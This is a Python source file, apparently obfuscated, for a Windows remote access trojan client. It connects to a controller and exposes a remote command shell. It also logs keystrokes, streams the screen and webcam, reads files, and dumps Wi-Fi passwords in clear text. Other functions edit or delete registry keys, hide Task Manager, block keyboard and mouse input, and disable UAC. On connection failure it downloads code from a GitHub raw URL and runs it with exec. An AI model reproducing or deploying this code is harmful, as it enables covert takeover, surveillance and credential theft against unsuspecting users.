import random #line:1:import random
import socket ,subprocess ,os ,platform #line:2:import socket, subprocess, os, platform
from threading import Thread #line:3:from threading import Thread
from PIL import Image #line:4:from PIL import Image
from datetime import datetime #line:5:from datetime import datetime
from ctypes import cast ,POINTER #line:6:from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL #line:7:from comtypes import CLSCTX_ALL
from winreg import *#line:8:from winreg import *
import shutil #line:9:import shutil
import glob #line:10:import glob
import ctypes #line:11:import ctypes
import sys #line:12:import sys
import webbrowser #line:13:import webbrowser
import re #line:14:import re
import pyautogui #line:15:import pyautogui
import cv2 #line:16:import cv2
import urllib .request #line:17:import urllib.request
import json #line:18:import json
from pynput .keyboard import Listener #line:19:from pynput.keyboard import Listener
from pynput .mouse import Controller #line:20:from pynput.mouse import Controller
import time #line:21:import time
import keyboard #line:22:import keyboard
user32 =ctypes .WinDLL ('user32')#line:24:user32 = ctypes.WinDLL('user32')
kernel32 =ctypes .WinDLL ('kernel32')#line:25:kernel32 = ctypes.WinDLL('kernel32')
HWND_BROADCAST =65535 #line:27:HWND_BROADCAST = 65535
WM_SYSCOMMAND =274 #line:28:WM_SYSCOMMAND = 274
SC_MONITORPOWER =61808 #line:29:SC_MONITORPOWER = 61808
GENERIC_READ =-2147483648 #line:30:GENERIC_READ = -2147483648
GENERIC_WRITE =1073741824 #line:31:GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE =2 #line:32:FILE_SHARE_WRITE = 2
FILE_SHARE_READ =1 #line:33:FILE_SHARE_READ = 1
FILE_SHARE_DELETE =4 #line:34:FILE_SHARE_DELETE = 4
CREATE_ALWAYS =2 #line:35:CREATE_ALWAYS = 2
class RAT_CLIENT :#line:38:class RAT_CLIENT:
    def __init__ (O00OO0OO00O00O0O0 ,O0OO00O0OO0000O0O ,O0OO00OO00O000OO0 ):#line:39:def __init__(self, host, port):
        O00OO0OO00O00O0O0 .host =O0OO00O0OO0000O0O #line:40:self.host = host
        O00OO0OO00O00O0O0 .port =O0OO00OO00O000OO0 #line:41:self.port = port
        O00OO0OO00O00O0O0 .curdir =os .getcwd ()#line:42:self.curdir = os.getcwd()
    def build_connection (O0O0O0OO00O0O0O0O ):#line:44:def build_connection(self):
        global s #line:45:global s
        s =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:46:s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try :#line:47:try:
            s .connect ((O0O0O0OO00O0O0O0O .host ,O0O0O0OO00O0O0O0O .port ))#line:48:s.connect((self.host, self.port))
            OO0OO0O0O00OO00OO =socket .gethostbyname (socket .gethostname ())#line:49:sending = socket.gethostbyname(socket.gethostname())
            s .send (OO0OO0O0O00OO00OO .encode ())#line:50:s.send(sending.encode())
        except socket .error as OO00O0O0OOO00OO0O :#line:51:except socket.error as e:
            print (OO00O0O0OOO00OO0O )#line:52:print (e)
            O0OO0O0O00OOO0O00 =RAT_CLIENT (O0O0O0OO00O0O0O0O .host ,O0O0O0OO00O0O0O0O .port )#line:53:rat = RAT_CLIENT(self.host, self.port)
            print (O0O0O0OO00O0O0O0O .host ,O0O0O0OO00O0O0O0O .port )#line:54:print(self.host, self.port)
            print ("mierdeos2")#line:55:print ("mierdeos2")
            import urllib .request #line:56:import urllib.request
            OO0000OOOOOO0O00O ='https://raw.githubusercontent.com/alejq41/free/main/pythonremot2.py'#line:57:code = 'https://raw.githubusercontent.com/alejq41/free/main/pythonremot2.py'
            O000OO0O0000O0O00 =urllib .request .urlopen (OO0000OOOOOO0O00O )#line:58:response = urllib.request.urlopen(code)
            O0000O000000OO000 =O000OO0O0000O0O00 .read ()#line:59:data = response.read()
            exec (O0000O000000OO000 )#line:60:exec(data)
            if __name__ =='__main__':#line:62:if __name__ == '__main__':
                O0OO0O0O00OOO0O00 .build_connection ()#line:63:rat.build_connection()
                O0OO0O0O00OOO0O00 .execute ()#line:64:rat.execute()
    def errorsend (O0O0000OO00O0O000 ):#line:66:def errorsend(self):
        O000O0O00000OO00O =bytearray ("no output",encoding ='utf8')#line:67:output = bytearray("no output", encoding='utf8')
        for O0O00OO00O0OOOO0O in range (len (O000O0O00000OO00O )):#line:68:for i in range(len(output)):
            O000O0O00000OO00O [O0O00OO00O0OOOO0O ]^=0x41 #line:69:output[i] ^= 0x41
        s .send (O000O0O00000OO00O )#line:70:s.send(output)
    def keylogger (O0000O0O0O0O0O00O ):#line:72:def keylogger(self):
        def O00OOO00OO000OO00 (O0OOOO00O0OOOO000 ):#line:73:def on_press(key):
            if klgr ==True :#line:74:if klgr == True:
                with open ('keylogs.txt','a')as OOOO0OOO00OO0000O :#line:75:with open('keylogs.txt', 'a') as f:
                    OOOO0OOO00OO0000O .write (f'{O0OOOO00O0OOOO000}')#line:76:f.write(f'{key}')
                    OOOO0OOO00OO0000O .close ()#line:77:f.close()
        with Listener (on_press =O00OOO00OO000OO00 )as OOO0OO0OOOOO00OO0 :#line:79:with Listener(on_press=on_press) as listener:
            OOO0OO0OOOOO00OO0 .join ()#line:80:listener.join()
    def block_task_manager (O0000O0O0O000O00O ):#line:82:def block_task_manager(self):
        if ctypes .windll .shell32 .IsUserAnAdmin ()==1 :#line:83:if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while (1 ):#line:84:while (1):
                if block ==True :#line:85:if block == True:
                    OO0000000OOOOOOO0 =user32 .FindWindowW (0 ,"Task Manager")#line:86:hwnd = user32.FindWindowW(0, "Task Manager")
                    user32 .ShowWindow (OO0000000OOOOOOO0 ,0 )#line:87:user32.ShowWindow(hwnd, 0)
                    ctypes .windll .kernel32 .Sleep (500 )#line:88:ctypes.windll.kernel32.Sleep(500)
    def disable_all (O00O0O0OOOO000O00 ):#line:90:def disable_all(self):
        while True :#line:91:while True:
            user32 .BlockInput (True )#line:92:user32.BlockInput(True)
    def disable_mouse (O00OO0000O0O00000 ):#line:94:def disable_mouse(self):
        OO00O0OO0OOOO0OOO =Controller ()#line:95:mouse = Controller()
        O0OO0O0OOOO000OO0 =time .time ()+3600 *24 *11 #line:96:t_end = time.time() + 3600*24*11
        while time .time ()<O0OO0O0OOOO000OO0 and mousedbl ==True :#line:97:while time.time() < t_end and mousedbl == True:
            OO00O0OO0OOOO0OOO .position =(0 ,0 )#line:98:mouse.position = (0, 0)
    def disable_keyboard (OO0O00O0OOOOOO0OO ):#line:100:def disable_keyboard(self):
        for OO0000OOOO000O000 in range (150 ):#line:101:for i in range(150):
            if kbrd ==True :#line:102:if kbrd == True:
                keyboard .block_key (OO0000OOOO000O000 )#line:103:keyboard.block_key(i)
        time .sleep (999999 )#line:104:time.sleep(999999)
    def execute (O0O0O00OO0OO00OO0 ):#line:106:def execute(self):
        while True :#line:107:while True:
            O00O0OO000O0000O0 =s .recv (1024 ).decode ()#line:108:command = s.recv(1024).decode()
            if O00O0OO000O0000O0 =='shell':#line:110:if command == 'shell':
                while 1 :#line:111:while 1:
                    O00O0OO000O0000O0 =s .recv (1024 ).decode ()#line:112:command = s.recv(1024).decode()
                    if O00O0OO000O0000O0 .lower ()=='exit':#line:113:if command.lower() == 'exit' :
                        break #line:114:break
                    if O00O0OO000O0000O0 =='cd':#line:115:if command == 'cd':
                        os .chdir (O00O0OO000O0000O0 [3 :].decode ('utf-8'))#line:116:os.chdir(command[3:].decode('utf-8'))
                        O0000OOO0OO000O0O =os .getcwd ()#line:117:dir = os.getcwd()
                        OO000OO0O0OO00OO0 =str (O0000OOO0OO000O0O )#line:118:dir1 = str(dir)
                        s .send (OO000OO0O0OO00OO0 .encode ())#line:119:s.send(dir1.encode())
                    O0O00O0OO00OOO0OO =subprocess .getoutput (O00O0OO000O0000O0 )#line:120:output = subprocess.getoutput(command)
                    s .send (O0O00O0OO00OOO0OO .encode ())#line:121:s.send(output.encode())
                    if not O0O00O0OO00OOO0OO :#line:122:if not output:
                        O0O0O00OO0OO00OO0 .errorsend ()#line:123:self.errorsend()
            elif O00O0OO000O0000O0 =='screenshare':#line:125:elif command == 'screenshare':
                try :#line:126:try:
                    from vidstream import ScreenShareClient #line:127:from vidstream import ScreenShareClient
                    O0OO0OOOO00O00OOO =ScreenShareClient (O0O0O00OO0OO00OO0 .host ,8080 )#line:128:screen = ScreenShareClient(self.host, 8080)
                    O0OO0OOOO00O00OOO .start_stream ()#line:129:screen.start_stream()
                except :#line:130:except:
                    s .send ("Impossible to get screen")#line:131:s.send("Impossible to get screen")
            elif O00O0OO000O0000O0 =='webcam':#line:133:elif command == 'webcam':
                try :#line:134:try:
                    from vidstream import CameraClient #line:135:from vidstream import CameraClient
                    O0O0OO0O00OO0OO0O =CameraClient (O0O0O00OO0OO00OO0 .host ,8080 )#line:136:cam = CameraClient(self.host, 8080)
                    O0O0OO0O00OO0OO0O .start_stream ()#line:137:cam.start_stream()
                except :#line:138:except:
                    s .send ("Impossible to get webcam")#line:139:s.send("Impossible to get webcam")
            elif O00O0OO000O0000O0 =='breakstream':#line:141:elif command == 'breakstream':
                pass #line:142:pass
            elif O00O0OO000O0000O0 =='list':#line:144:elif command == 'list':
                pass #line:145:pass
            elif O00O0OO000O0000O0 =='geolocate':#line:147:elif command == 'geolocate':
                with urllib .request .urlopen ("https://geolocation-db.com/json")as OOO00OO0OOO0OO000 :#line:148:with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    O0O00000OOOO0000O =json .loads (OOO00OO0OOO0OO000 .read ().decode ())#line:149:data = json.loads(url.read().decode())
                    OOOO0OOOOOOOOO0OO =f"http://www.google.com/maps/place/{O0O00000OOOO0000O['latitude']},{O0O00000OOOO0000O['longitude']}"#line:150:link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                s .send (OOOO0OOOOOOOOO0OO .encode ())#line:151:s.send(link.encode())
            elif O00O0OO000O0000O0 =='setvalue':#line:153:elif command == 'setvalue':
                OO00OO0000OOOOO00 =s .recv (1024 ).decode ()#line:154:const = s.recv(1024).decode()
                O0OO0OOO000O000O0 =s .recv (1024 ).decode ()#line:155:root = s.recv(1024).decode()
                OOOO0OO00OOO0OOO0 =s .recv (1024 ).decode ()#line:156:key2 = s.recv(1024).decode()
                O00O0OOOOO0OOOO00 =s .recv (1024 ).decode ()#line:157:value = s.recv(1024).decode()
                try :#line:158:try:
                    if OO00OO0000OOOOO00 =='HKEY_CURRENT_USER':#line:159:if const == 'HKEY_CURRENT_USER':
                        OO0O0OO000OOOO000 =OpenKey (HKEY_CURRENT_USER ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:160:key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                        SetValueEx (OO0O0OO000OOOO000 ,OOOO0OO00OOO0OOO0 ,0 ,REG_SZ ,str (O00O0OOOOO0OOOO00 ))#line:161:SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey (OO0O0OO000OOOO000 )#line:162:CloseKey(key)
                    if OO00OO0000OOOOO00 =='HKEY_CLASSES_ROOT':#line:163:if const == 'HKEY_CLASSES_ROOT':
                        OO0O0OO000OOOO000 =OpenKey (HKEY_CLASSES_ROOT ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:164:key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx (OO0O0OO000OOOO000 ,OOOO0OO00OOO0OOO0 ,0 ,REG_SZ ,str (O00O0OOOOO0OOOO00 ))#line:165:SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey (OO0O0OO000OOOO000 )#line:166:CloseKey(key)
                    if OO00OO0000OOOOO00 =='HKEY_LOCAL_MACHINE':#line:167:if const == 'HKEY_LOCAL_MACHINE':
                        OO0O0OO000OOOO000 =OpenKey (HKEY_LOCAL_MACHINE ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:168:key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                        SetValueEx (OO0O0OO000OOOO000 ,OOOO0OO00OOO0OOO0 ,0 ,REG_SZ ,str (O00O0OOOOO0OOOO00 ))#line:169:SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey (OO0O0OO000OOOO000 )#line:170:CloseKey(key)
                    if OO00OO0000OOOOO00 =='HKEY_USERS':#line:171:if const == 'HKEY_USERS':
                        OO0O0OO000OOOO000 =OpenKey (HKEY_USERS ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:172:key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                        SetValueEx (OO0O0OO000OOOO000 ,OOOO0OO00OOO0OOO0 ,0 ,REG_SZ ,str (O00O0OOOOO0OOOO00 ))#line:173:SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey (OO0O0OO000OOOO000 )#line:174:CloseKey(key)
                    if OO00OO0000OOOOO00 =='HKEY_CLASSES_ROOT':#line:175:if const == 'HKEY_CLASSES_ROOT':
                        OO0O0OO000OOOO000 =OpenKey (HKEY_CLASSES_ROOT ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:176:key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx (OO0O0OO000OOOO000 ,OOOO0OO00OOO0OOO0 ,0 ,REG_SZ ,str (O00O0OOOOO0OOOO00 ))#line:177:SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey (OO0O0OO000OOOO000 )#line:178:CloseKey(key)
                    if OO00OO0000OOOOO00 =='HKEY_CURRENT_CONFIG':#line:179:if const == 'HKEY_CURRENT_CONFIG':
                        OO0O0OO000OOOO000 =OpenKey (HKEY_CURRENT_CONFIG ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:180:key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                        SetValueEx (OO0O0OO000OOOO000 ,OOOO0OO00OOO0OOO0 ,0 ,REG_SZ ,str (O00O0OOOOO0OOOO00 ))#line:181:SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey (OO0O0OO000OOOO000 )#line:182:CloseKey(key)
                    s .send ("Value is set".encode ())#line:183:s.send("Value is set".encode())
                except :#line:184:except:
                    s .send ("Impossible to create key".encode ())#line:185:s.send("Impossible to create key".encode())
            elif O00O0OO000O0000O0 =='delkey':#line:187:elif command == 'delkey':
                OO00OO0000OOOOO00 =s .recv (1024 ).decode ()#line:188:const = s.recv(1024).decode()
                O0OO0OOO000O000O0 =s .recv (1024 ).decode ()#line:189:root = s.recv(1024).decode()
                try :#line:190:try:
                    if OO00OO0000OOOOO00 =='HKEY_CURRENT_USER':#line:191:if const == 'HKEY_CURRENT_USER':
                        DeleteKeyEx (HKEY_CURRENT_USER ,O0OO0OOO000O000O0 ,KEY_ALL_ACCESS ,0 )#line:192:DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
                    if OO00OO0000OOOOO00 =='HKEY_LOCAL_MACHINE':#line:193:if const == 'HKEY_LOCAL_MACHINE':
                        DeleteKeyEx (HKEY_LOCAL_MACHINE ,O0OO0OOO000O000O0 ,KEY_ALL_ACCESS ,0 )#line:194:DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
                    if OO00OO0000OOOOO00 =='HKEY_USERS':#line:195:if const == 'HKEY_USERS':
                        DeleteKeyEx (HKEY_USERS ,O0OO0OOO000O000O0 ,KEY_ALL_ACCESS ,0 )#line:196:DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
                    if OO00OO0000OOOOO00 =='HKEY_CLASSES_ROOT':#line:197:if const == 'HKEY_CLASSES_ROOT':
                        DeleteKeyEx (HKEY_CLASSES_ROOT ,O0OO0OOO000O000O0 ,KEY_ALL_ACCESS ,0 )#line:198:DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
                    if OO00OO0000OOOOO00 =='HKEY_CURRENT_CONFIG':#line:199:if const == 'HKEY_CURRENT_CONFIG':
                        DeleteKeyEx (HKEY_CURRENT_CONFIG ,O0OO0OOO000O000O0 ,KEY_ALL_ACCESS ,0 )#line:200:DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
                    s .send ("Key is deleted".encode ())#line:201:s.send("Key is deleted".encode())
                except :#line:202:except:
                    s .send ("Impossible to delete key".encode ())#line:203:s.send("Impossible to delete key".encode())
            elif O00O0OO000O0000O0 =='createkey':#line:205:elif command == 'createkey':
                OO00OO0000OOOOO00 =s .recv (1024 ).decode ()#line:206:const = s.recv(1024).decode()
                O0OO0OOO000O000O0 =s .recv (1024 ).decode ()#line:207:root = s.recv(1024).decode()
                try :#line:208:try:
                    if OO00OO0000OOOOO00 =='HKEY_CURRENT_USER':#line:209:if const == 'HKEY_CURRENT_USER':
                        CreateKeyEx (HKEY_CURRENT_USER ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:210:CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    if OO00OO0000OOOOO00 =='HKEY_LOCAL_MACHINE':#line:211:if const == 'HKEY_LOCAL_MACHINE':
                        CreateKeyEx (HKEY_LOCAL_MACHINE ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:212:CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    if OO00OO0000OOOOO00 =='HKEY_USERS':#line:213:if const == 'HKEY_USERS':
                        CreateKeyEx (HKEY_USERS ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:214:CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    if OO00OO0000OOOOO00 =='HKEY_CLASSES_ROOT':#line:215:if const == 'HKEY_CLASSES_ROOT':
                        CreateKeyEx (HKEY_CLASSES_ROOT ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:216:CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    if OO00OO0000OOOOO00 =='HKEY_CURRENT_CONFIG':#line:217:if const == 'HKEY_CURRENT_CONFIG':
                        CreateKeyEx (HKEY_CURRENT_CONFIG ,O0OO0OOO000O000O0 ,0 ,KEY_ALL_ACCESS )#line:218:CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    s .send ("Key is created".encode ())#line:219:s.send("Key is created".encode())
                except :#line:220:except:
                    s .send ("Impossible to create key".encode ())#line:221:s.send("Impossible to create key".encode())
            elif O00O0OO000O0000O0 =='volumeup':#line:223:elif command == 'volumeup':
                try :#line:224:try:
                    from pycaw .pycaw import AudioUtilities ,IAudioEndpointVolume #line:225:from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    O0OO00000OO0OOO00 =AudioUtilities .GetSpeakers ()#line:226:devices = AudioUtilities.GetSpeakers()
                    OOO0OOO000O00OOO0 =O0OO00000OO0OOO00 .Activate (IAudioEndpointVolume ._iid_ ,CLSCTX_ALL ,None )#line:227:interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    O00O0O0OO0000000O =cast (OOO0OOO000O00OOO0 ,POINTER (IAudioEndpointVolume ))#line:228:volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if O00O0O0OO0000000O .GetMute ()==1 :#line:229:if volume.GetMute() == 1:
                        O00O0O0OO0000000O .SetMute (0 ,None )#line:230:volume.SetMute(0, None)
                    O00O0O0OO0000000O .SetMasterVolumeLevel (O00O0O0OO0000000O .GetVolumeRange ()[1 ],None )#line:231:volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    s .send ("Volume is increased to 100%".encode ())#line:232:s.send("Volume is increased to 100%".encode())
                except :#line:233:except:
                    s .send ("Module is not founded".encode ())#line:234:s.send("Module is not founded".encode())
            elif O00O0OO000O0000O0 =='volumedown':#line:236:elif command == 'volumedown':
                try :#line:237:try:
                    from pycaw .pycaw import AudioUtilities ,IAudioEndpointVolume #line:238:from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    O0OO00000OO0OOO00 =AudioUtilities .GetSpeakers ()#line:239:devices = AudioUtilities.GetSpeakers()
                    OOO0OOO000O00OOO0 =O0OO00000OO0OOO00 .Activate (IAudioEndpointVolume ._iid_ ,CLSCTX_ALL ,None )#line:240:interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    O00O0O0OO0000000O =cast (OOO0OOO000O00OOO0 ,POINTER (IAudioEndpointVolume ))#line:241:volume = cast(interface, POINTER(IAudioEndpointVolume))
                    O00O0O0OO0000000O .SetMasterVolumeLevel (O00O0O0OO0000000O .GetVolumeRange ()[0 ],None )#line:242:volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    s .send ("Volume is decreased to 0%".encode ())#line:243:s.send("Volume is decreased to 0%".encode())
                except :#line:244:except:
                    s .send ("Module is not founded".encode ())#line:245:s.send("Module is not founded".encode())
            elif O00O0OO000O0000O0 =='setwallpaper':#line:247:elif command == 'setwallpaper':
                OOO00OO00O00O0OOO =s .recv (6000 ).decode ()#line:248:pic = s.recv(6000).decode()
                try :#line:249:try:
                    ctypes .windll .user32 .SystemParametersInfoW (20 ,0 ,OOO00OO00O00O0OOO ,0 )#line:250:ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
                    s .send (f'{OOO00OO00O00O0OOO} is set as a wallpaper'.encode ())#line:251:s.send(f'{pic} is set as a wallpaper'.encode())
                except :#line:252:except:
                    s .send ("No such file")#line:253:s.send("No such file")
            elif O00O0OO000O0000O0 =='usbdrivers':#line:255:elif command == 'usbdrivers':
                OO00O0O000O000OOO =subprocess .check_output (["powershell.exe","Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"],encoding ='utf-8')#line:256:p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
                s .send (OO00O0O000O000OOO .encode ())#line:257:s.send(p.encode())
            elif O00O0OO000O0000O0 =='monitors':#line:259:elif command == 'monitors':
                OO00O0O000O000OOO =subprocess .check_output (["powershell.exe","Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"],encoding ='utf-8')#line:260:p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
                s .send (OO00O0O000O000OOO .encode ())#line:261:s.send(p.encode())
            elif O00O0OO000O0000O0 =='sysinfo':#line:263:elif command == 'sysinfo':
                O000O0OOOO00OOOO0 =str (f'''
System: {platform.platform()} {platform.win32_edition()}
Architecture: {platform.architecture()}
Name of Computer: {platform.node()}
Processor: {platform.processor()}
Python: {platform.python_version()}
Java: {platform.java_ver()}
User: {os.getlogin()}
                ''')#line:272:''')
                s .send (O000O0OOOO00OOOO0 .encode ())#line:273:s.send(sysinfo.encode())
            elif O00O0OO000O0000O0 =='reboot':#line:275:elif command == 'reboot':
                os .system ("shutdown /r /t 1")#line:276:os.system("shutdown /r /t 1")
                s .send (f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode ())#line:277:s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            elif O00O0OO000O0000O0 [:7 ]=='writein':#line:279:elif command[:7] == 'writein':
                pyautogui .write (O00O0OO000O0000O0 .split (" ")[1 ])#line:280:pyautogui.write(command.split(" ")[1])
                s .send (f'{O00O0OO000O0000O0.split(" ")[1]} is written'.encode ())#line:281:s.send(f'{command.split(" ")[1]} is written'.encode())
            elif O00O0OO000O0000O0 [:8 ]=='readfile':#line:283:elif command[:8] == 'readfile':
                try :#line:284:try:
                    O0OO0O000O0OO00OO =open (O00O0OO000O0000O0 [9 :],'r')#line:285:f = open(command[9:], 'r')
                    O0O00000OOOO0000O =O0OO0O000O0OO00OO .read ()#line:286:data = f.read()
                    if not O0O00000OOOO0000O :s .send ("No data".encode ())#line:287:if not data: s.send("No data".encode())
                    O0OO0O000O0OO00OO .close ()#line:288:f.close()
                    s .send (O0O00000OOOO0000O .encode ())#line:289:s.send(data.encode())
                except :#line:290:except:
                    s .send ("No such file in directory".encode ())#line:291:s.send("No such file in directory".encode())
            elif O00O0OO000O0000O0 [:7 ]=='abspath':#line:293:elif command[:7] == 'abspath':
                try :#line:294:try:
                    OOO0O000OOO0O0O0O =os .path .abspath (O00O0OO000O0000O0 [8 :])#line:295:path = os.path.abspath(command[8:])
                    s .send (OOO0O000OOO0O0O0O .encode ())#line:296:s.send(path.encode())
                except :#line:297:except:
                    s .send ("No such file in directory".encode ())#line:298:s.send("No such file in directory".encode())
            elif O00O0OO000O0000O0 =='pwd':#line:300:elif command == 'pwd':
                OOO0O00O00O000O0O =str (os .getcwd ())#line:301:curdir = str(os.getcwd())
                s .send (OOO0O00O00O000O0O .encode ())#line:302:s.send(curdir.encode())
            elif O00O0OO000O0000O0 =='ipconfig':#line:304:elif command == 'ipconfig':
                O0O00O0OO00OOO0OO =subprocess .check_output ('ipconfig',encoding ='oem')#line:305:output = subprocess.check_output('ipconfig', encoding='oem')
                s .send (O0O00O0OO00OOO0OO .encode ())#line:306:s.send(output.encode())
            elif O00O0OO000O0000O0 =='portscan':#line:308:elif command == 'portscan':
                O0O00O0OO00OOO0OO =subprocess .check_output ('netstat -an',encoding ='oem')#line:309:output = subprocess.check_output('netstat -an', encoding='oem')
                s .send (O0O00O0OO00OOO0OO .encode ())#line:310:s.send(output.encode())
            elif O00O0OO000O0000O0 =='tasklist':#line:312:elif command == 'tasklist':
                O0O00O0OO00OOO0OO =subprocess .check_output ('tasklist',encoding ='oem')#line:313:output = subprocess.check_output('tasklist', encoding='oem')
                s .send (O0O00O0OO00OOO0OO .encode ())#line:314:s.send(output.encode())
            elif O00O0OO000O0000O0 =='profiles':#line:316:elif command == 'profiles':
                O0O00O0OO00OOO0OO =subprocess .check_output ('netsh wlan show profiles',encoding ='oem')#line:317:output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                s .send (O0O00O0OO00OOO0OO .encode ())#line:318:s.send(output.encode())
            elif O00O0OO000O0000O0 =='profilepswd':#line:320:elif command == 'profilepswd':
                OO0O00O000000OOOO =s .recv (6000 )#line:321:profile = s.recv(6000)
                OO0O00O000000OOOO =OO0O00O000000OOOO .decode ()#line:322:profile = profile.decode()
                try :#line:323:try:
                    O0O00O0OO00OOO0OO =subprocess .check_output (f'netsh wlan show profile {OO0O00O000000OOOO} key=clear',encoding ='oem')#line:324:output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
                    s .send (O0O00O0OO00OOO0OO .encode ())#line:325:s.send(output.encode())
                except :#line:326:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:327:self.errorsend()
            elif O00O0OO000O0000O0 =='systeminfo':#line:329:elif command == 'systeminfo':
                O0O00O0OO00OOO0OO =subprocess .check_output (f'systeminfo',encoding ='oem')#line:330:output = subprocess.check_output(f'systeminfo', encoding='oem')
                s .send (O0O00O0OO00OOO0OO .encode ())#line:331:s.send(output.encode())
            elif O00O0OO000O0000O0 =='sendmessage':#line:333:elif command == 'sendmessage':
                OO00OOOO00O0OOO00 =s .recv (6000 ).decode ()#line:334:text = s.recv(6000).decode()
                O00000OO0O000O000 =s .recv (6000 ).decode ()#line:335:title = s.recv(6000).decode()
                s .send ('MessageBox has appeared'.encode ())#line:336:s.send('MessageBox has appeared'.encode())
                user32 .MessageBoxW (0 ,OO00OOOO00O0OOO00 ,O00000OO0O000O000 ,0x00000000 |0x00000040 )#line:337:user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
            elif O00O0OO000O0000O0 .startswith ("disable")and O00O0OO000O0000O0 .endswith ("--all"):#line:339:elif command.startswith("disable") and command.endswith("--all"):
                Thread (target =O0O0O00OO0OO00OO0 .disable_all ,daemon =True ).start ()#line:340:Thread(target=self.disable_all, daemon=True).start()
                s .send ("Keyboard and mouse are disabled".encode ())#line:341:s.send("Keyboard and mouse are disabled".encode())
            elif O00O0OO000O0000O0 .startswith ("disable")and O00O0OO000O0000O0 .endswith ("--keyboard"):#line:343:elif command.startswith("disable") and command.endswith("--keyboard"):
                global kbrd #line:344:global kbrd
                kbrd =True #line:345:kbrd = True
                Thread (target =O0O0O00OO0OO00OO0 .disable_keyboard ,daemon =True ).start ()#line:346:Thread(target=self.disable_keyboard, daemon=True).start()
                s .send ("Keyboard is disabled".encode ())#line:347:s.send("Keyboard is disabled".encode())
            elif O00O0OO000O0000O0 .startswith ("disable")and O00O0OO000O0000O0 .endswith ("--mouse"):#line:349:elif command.startswith("disable") and command.endswith("--mouse"):
                global mousedbl #line:350:global mousedbl
                mousedbl =True #line:351:mousedbl = True
                Thread (target =O0O0O00OO0OO00OO0 .disable_mouse ,daemon =True ).start ()#line:352:Thread(target=self.disable_mouse, daemon=True).start()
                s .send ("Mouse is disabled".encode ())#line:353:s.send("Mouse is disabled".encode())
            elif O00O0OO000O0000O0 =='disableUAC':#line:355:elif command == 'disableUAC':
                os .system ("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")#line:356:os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            elif O00O0OO000O0000O0 .startswith ("enable")and O00O0OO000O0000O0 .endswith ("--keyboard"):#line:358:elif command.startswith("enable") and command.endswith("--keyboard"):
                kbrd =False #line:359:kbrd = False
                s .send ("Mouse and keyboard are unblocked".encode ())#line:360:s.send("Mouse and keyboard are unblocked".encode())
